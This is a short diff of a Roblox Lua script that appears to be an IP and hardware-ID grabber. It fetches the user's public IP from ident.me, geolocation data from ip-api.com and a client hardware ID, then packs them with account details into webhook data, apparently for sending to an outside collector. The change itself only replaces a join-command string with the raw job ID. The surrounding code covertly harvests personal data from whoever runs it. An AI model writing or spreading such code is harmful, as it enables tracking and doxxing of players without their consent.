@@ -12,7 +12,7 @@ local Country = game.LocalizationService.RobloxLocaleId
 local GetIp = game:HttpGet("https://v4.ident.me/")
 local GetData = game:HttpGet("http://ip-api.com/json")
 local GetHwid = game:GetService("RbxAnalyticsService"):GetClientId()
-local ConsoleJobId = string.format("Roblox.GameLauncher.joinGameInstance(%d, \"%s\")", game.PlaceId, game.JobId)
+local JobId = game.JobId
 
 local GAMENAME = MarketplaceService:GetProductInfo(game.PlaceId).Name
 
@@ -44,7 +44,7 @@ local function createWebhookData()
                     Userid, DName, Name, Userid, MembershipType, AccountAge, Country, GetIp, GetHwid,
                     tostring(os.date("%m/%d/%Y")), tostring(os.date("%X")),
                     game.PlaceId, GAMENAME, game.PlaceId, webhookcheck,
-                    GetData, ConsoleJobId
+                    GetData, JobId
                 ),
                 ["type"] = "rich",
                 ["color"] = tonumber("0xFFD700"),
